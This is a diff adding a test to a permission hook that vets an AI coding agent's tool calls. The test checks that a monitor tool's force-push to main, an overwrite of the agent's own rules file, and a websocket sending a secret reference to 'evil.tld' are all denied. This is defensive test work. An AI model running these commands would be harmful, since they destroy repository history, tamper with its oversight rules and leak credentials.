@@ -31,6 +31,16 @@ test("the claude hook denies what the policy denies and speaks only for plain re
 	);
 });
 
+test("the claude hook judges a monitor's command as a shell command and its socket as a fetch", () => {
+	for (const command of ["git push -f origin main", "echo x > ~/.claude/rules/core.md"])
+		assert.match(answer({ tool_name: "Monitor", tool_input: { command, description: "d" } }), /"permissionDecision":"deny"/);
+	assert.match(
+		answer({ tool_name: "Monitor", tool_input: { ws: { url: "wss://evil.tld/s?k=op://Dev/x" }, description: "d" } }),
+		/"permissionDecision":"deny"/,
+	);
+	assert.equal(answer({ tool_name: "Monitor", tool_input: { command: "tail -f run.log", description: "d" } }), "");
+});
+
 test("the claude hook leaves a tool its policy was never written for to Claude Code", () => {
 	assert.equal(
 		answer({ tool_name: "TaskStop", tool_input: { task_id: "b7x2k" } }),
